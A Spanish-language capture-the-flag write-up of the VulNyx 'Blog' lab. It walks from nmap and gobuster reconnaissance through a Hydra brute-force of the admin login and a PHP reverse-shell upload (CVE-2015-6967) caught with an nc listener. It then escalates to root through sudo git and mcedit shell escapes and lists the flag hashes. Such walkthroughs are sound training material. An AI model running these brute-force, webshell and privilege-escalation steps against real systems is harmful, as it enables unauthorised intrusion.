---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulNyx]]"
web: https://www.vulnhub.com/blog
dificultad: Fácil
os: Linux
relacionados:
  - "[[hydra]]"
---
#  VulNyx - Blog 

## Reconocimiento

#### Escaneo de Puertos

**Comando:**
```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG allPorts 192.168.18.216
```

**Resultado:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

#### Escaneo de Servicios

**Comando:**
```bash
nmap -p22,80 -sCV 192.168.18.216 -oN targeted
```

**Resultado:**
```
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

#### Enumeración HTTP

Se encuentra un servidor HTTP. Primero hago un escaneo de directorios:

**Comando:**
```bash
gobuster dir -u http://192.168.18.216 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 15 --add-slash -x txt,html,php,js
```

**Resultado:**
```
/index.php            (Status: 200)
/icons/               (Status: 403)
/my_weblog/           (Status: 200)
```

Dentro de `/my_weblog/`,  ejecuto otro reconocimiento:

**Comando:**
```bash
gobuster dir -u http://192.168.18.216/my_weblog -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 15 --add-slash -x txt,html,php,js
```

**Resultado:**
```
/admin/               (Status: 200)
/plugins/             (Status: 200)
/themes/              (Status: 200)
/admin.php
```

Encuentro un panel de login en `/admin.php`.

---

## Explotación de vulnerabilidades

#### Fuerza Bruta HTTP

Utilizo Hydra para obtener credenciales de acceso:

**Comando:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.18.216 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect" -F -I -t 30
```
- **Estructura general**: ruta:parámetros_POST:indicador_de_error
- **Partes**:
	- **Ruta del formulario**: /my_weblog/admin.php (URL del login).
	- **Parámetros POST**:
        - **username=admin**: Campo de usuario (fijo como admin).
        - **password=^PASS^**: Hydra reemplazará ^PASS^ con cada contraseña de la lista.
    - **Indicador de error: Incorrect** → Si la respuesta contiene este texto, el login falló.

- **-F**: Detiene el ataque en cuanto se encuentra la primera combinación válida (usuario + contraseña).
- **-I**: Ignora conexiones fallidas o errores de red, y sigue intentando.
- **-t 30**: Usa 30 hilos simultáneos, es decir, lanza 30 intentos al mismo tiempo para acelerar el proceso.
    
**Resultado:**
```
login: admin   password: kisses
```

#### Subida de Shell (CVE-2015-6967)

En el panel de Plugins, selecciono `My image` para subir una shell PHP:

**Shell Subida:**
Uso `PHP PentestMonkey` de la web **RevShells**

Encuentro la ruta de la descarga viendo el exploit que aparece usando `searchsploit`. La ruta parece ser: `/my_weblog/content/private/plugins/my_image/image.php`.

Inicio un listener y envío una reverse shell:

**Listener:**
```bash
nc -lvp 1234
```

**Petición Curl:**
```bash
curl "http://192.168.18.216/my_weblog/content/private/plugins/my_image/image.php"
```

**Resultado:**
```bash
www-data@blog:/$
```

---

## Escalada de privilegios

#### De `www-data` a `admin`

```bash
sudo -l
```
Descubro que `www-data` puede ejecutar `git` como `admin`:

**Comando:**
```bash
sudo -u admin git -p help config
```

**Exploit (GTFOBins):**
```bash
!/bin/bash
```

**Resultado:**
```bash
admin@blog:~$
```

#### De `admin` a `root`

Encuentro que `admin` puede ejecutar `mcedit` como `root`:

**Comando:**
```bash
sudo mcedit
```

Dentro de `mcedit`, accedo al menú de usuario con `ALT + F`. Desde allí, selecciono `Invoke Shell`.

**Resultado:**
```bash
root@blog:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Uso la maquina para hacer pivoting con [[Gift]]

## Bandera(s)

> [!flag] `flag{user}`
> 1385bbd4fcdb68d2cc5d5204f97d4a80
^bandera-user

> [!flag] `flag{root}`
> 6c24e7883470e2c1683df7672576a1f7
^bandera-root

